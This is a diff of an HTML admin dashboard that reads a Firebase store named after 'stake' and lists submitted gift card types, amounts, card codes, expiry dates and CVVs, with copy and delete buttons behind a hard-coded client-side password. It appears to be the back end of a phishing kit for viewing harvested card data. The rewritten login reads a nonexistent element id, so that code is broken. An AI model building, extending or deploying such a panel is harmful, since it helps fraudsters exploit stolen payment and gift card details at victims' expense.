@@ -1,215 +1,168 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Admin Panel - GiftCard Logs</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<title>Admin Dashboard</title>
 
 <!-- Firebase -->
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
 <style>
     body {
-        font-family: Arial, sans-serif;
-        background: #0b3d91;
         margin: 0;
-        padding: 0;
+        background: #111;
         color: #fff;
+        font-family: Arial, sans-serif;
     }
-    .container {
-        max-width: 1100px;
+
+    .login-box, .dashboard {
+        max-width: 500px;
         margin: auto;
         padding: 20px;
     }
-    h1 {
-        text-align: center;
-        margin-bottom: 20px;
-        text-transform: uppercase;
-        color: #ffd700;
-    }
-    #passwordScreen {
-        position: fixed;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        background: #0b3d91;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-        z-index: 9999;
-    }
-    #passwordScreen input {
-        padding: 10px 15px;
-        font-size: 18px;
-        border: 2px solid #ffd700;
-        border-radius: 5px;
-        outline: none;
-        width: 260px;
-        margin-bottom: 10px;
-    }
-    #passwordScreen button {
-        padding: 10px 20px;
-        background: #ffd700;
-        border: none;
-        font-size: 16px;
-        cursor: pointer;
-        color: #0b3d91;
-        font-weight: bold;
-        border-radius: 5px;
-    }
-    table {
-        width: 100%;
-        border-collapse: collapse;
-        background: white;
-        color: black;
-        border-radius: 10px;
-        overflow: hidden;
-    }
-    th, td {
-        padding: 12px 10px;
-        border-bottom: 1px solid #ccc;
+
+    .login-box {
+        margin-top: 90px;
+        background: #1a1a1a;
+        padding: 25px;
+        border-radius: 12px;
+        box-shadow: 0 0 12px rgba(255,255,255,0.1);
         text-align: center;
     }
-    th {
-        background: #ffd700;
-        color: #0b3d91;
-        font-weight: bold;
-    }
-    tr:hover {
-        background: #f1f1f1;
-    }
-    .copyBtn {
-        padding: 6px 10px;
-        background: #0b3d91;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        font-size: 12px;
-    }
-    #searchBox {
+
+    input {
         width: 100%;
-        padding: 12px;
+        padding: 14px;
+        border-radius: 8px;
+        border: none;
         margin-bottom: 15px;
-        border-radius: 5px;
-        border: 2px solid #ffd700;
-        font-size: 16px;
-        outline: none;
+        font-size: 17px;
+        background: #222;
+        color: #fff;
     }
+
+    button {
+        width: 100%;
+        background: #ffcc00;
+        border: none;
+        padding: 15px;
+        border-radius: 8px;
+        font-size: 17px;
+        font-weight: bold;
+        color: #000;
+    }
+
+    .entry {
+        background: #1e1e1e;
+        padding: 15px;
+        margin: 15px 0;
+        border-radius: 10px;
+        line-height: 1.5;
+        border-left: 4px solid #ffcc00;
+    }
+
+    .delete-btn {
+        background: red;
+        color: white;
+        padding: 10px;
+        margin-top: 10px;
+        width: 100%;
+        border-radius: 6px;
+        border: none;
+        font-size: 15px;
+    }
+
+    .hidden {
+        display: none;
+    }
+
 </style>
 </head>
 <body>
 
-<!-- PASSWORD SCREEN -->
-<div id="passwordScreen">
-    <h2>Admin Access</h2>
-    <input type="password" id="adminPass" placeholder="Enter password">
-    <button onclick="unlockAdmin()">Enter</button>
-    <p id="errorMsg" style="color:red; margin-top:10px; display:none;">Incorrect password</p>
+<!-- PASSWORD GATE -->
+<div class="login-box" id="loginBox">
+    <h2>Admin Login</h2>
+    <input type="password" id="adminPass" placeholder="Enter Password">
+    <button onclick="checkPass()">Login</button>
+    <p style="color:red; display:none;" id="wrongPass">Incorrect password</p>
 </div>
 
-<div class="container" style="display:none;" id="adminContent">
-    <h1>GiftCard Submissions</h1>
-
-    <input type="text" id="searchBox" placeholder="Search gift card type, number, currency...">
-
-    <table>
-        <thead>
-            <tr>
-                <th>Card Type</th>
-                <th>Currency</th>
-                <th>Amount</th>
-                <th>Card Number</th>
-                <th>Expiry</th>
-                <th>CVV</th>
-                <th>User Agent</th>
-                <th>Time</th>
-            </tr>
-        </thead>
-        <tbody id="dataTable"></tbody>
-    </table>
+<!-- DASHBOARD -->
+<div class="dashboard hidden" id="dashboard">
+    <h2 style="text-align:center;">Submitted Giftcards</h2>
+    <div id="dataList"></div>
 </div>
 
 <script>
-/* ------- PASSWORD GATE ------- */
-function unlockAdmin() {
-    const entered = document.getElementById("adminPass").value;
-    const correct = "suwe"; // <<< SET YOUR PASSWORD HERE
-
-    if (entered === correct) {
-        document.getElementById("passwordScreen").style.display = "none";
-        document.getElementById("adminContent").style.display = "block";
-    } else {
-        document.getElementById("errorMsg").style.display = "block";
-    }
-}
-
-/* ------- FIREBASE INIT ------- */
+// ------------------------------------------------------------
+// FIREBASE SETUP
+// ------------------------------------------------------------
 var firebaseConfig = {
     databaseURL: "https://stake-f540f-default-rtdb.firebaseio.com/"
 };
 firebase.initializeApp(firebaseConfig);
+const db = firebase.database().ref("submitted_cards");
 
-/* ------- LOAD DATA ------- */
-const tableBody = document.getElementById("dataTable");
+// ------------------------------------------------------------
+// PASSWORD GATE
+// ------------------------------------------------------------
+const CORRECT_PASS = "suwe"; // change it
 
-firebase.database().ref("submitted_cards").on("value", snapshot => {
-    tableBody.innerHTML = "";
-    let items = [];
+function checkPass() {
+    const input = document.getElementById("suwe").value;
 
-    snapshot.forEach(child => {
-        items.push({ id: child.key, ...child.val() });
-    });
-
-    // Sort by newest first
-    items.reverse();
-
-    items.forEach(data => {
-        const row = document.createElement("tr");
-
-        row.innerHTML = `
-            <td>${data.giftCardType || ""}</td>
-            <td>${data.currency || ""}</td>
-            <td>${data.amount || ""}</td>
-
-            <td>
-                ${data.cardCode || ""}
-                <button class="copyBtn" onclick="copyText('${data.cardCode || ""}')">Copy</button>
-            </td>
-
-            <td>${data.expiryDate || "-"}</td>
-
-            <td>
-                ${data.cvv || ""}
-                ${data.cvv ? `<button class='copyBtn' onclick="copyText('${data.cvv}')">Copy</button>` : ""}
-            </td>
-
-            <td>${data.userAgent ? data.userAgent.substring(0, 15) + "..." : ""}</td>
-            <td>${data.time || ""}</td>
-        `;
-
-        tableBody.appendChild(row);
-    });
-});
-
-/* ------- COPY FUNCTION ------- */
-function copyText(text) {
-    navigator.clipboard.writeText(text);
-    alert("Copied: " + text);
+    if (input === CORRECT_PASS) {
+        document.getElementById("loginBox").classList.add("hidden");
+        document.getElementById("dashboard").classList.remove("hidden");
+        loadData();
+    } else {
+        document.getElementById("wrongPass").style.display = "block";
+    }
 }
 
-/* ------- SEARCH FILTER ------- */
-document.getElementById("searchBox").addEventListener("keyup", function() {
-    const filter = this.value.toLowerCase();
-    const rows = tableBody.getElementsByTagName("tr");
+// ------------------------------------------------------------
+// LOAD DATA LIVE
+// ------------------------------------------------------------
+function loadData() {
+    db.on("value", (snapshot) => {
+        const dataList = document.getElementById("dataList");
+        dataList.innerHTML = "";
 
-    for (let r of rows) {
-        const txt = r.innerText.toLowerCase();
-        r.style.display = txt.includes(filter) ? "" : "none";
+        snapshot.forEach(entry => {
+            const key = entry.key;
+            const data = entry.val();
+
+            const box = document.createElement("div");
+            box.className = "entry";
+
+            box.innerHTML = `
+                <strong>Type:</strong> ${data.giftCardType}<br>
+                <strong>Currency:</strong> ${data.currency}<br>
+                <strong>Amount:</strong> ${data.amount}<br>
+                <strong>Code:</strong> ${data.cardCode}<br>
+                <strong>Expiry:</strong> ${data.expiryDate}<br>
+                <strong>CVV:</strong> ${data.cvv}<br>
+                <strong>Time:</strong> ${data.time}<br>
+                <button class="delete-btn" onclick="deleteEntry('${key}')">Delete</button>
+            `;
+
+            dataList.prepend(box);
+        });
+    });
+}
+
+// ------------------------------------------------------------
+// DELETE ENTRY
+// ------------------------------------------------------------
+function deleteEntry(id) {
+    if (confirm("Delete this entry?")) {
+        db.child(id).remove();
     }
-});
+}
 </script>
 
 </body>
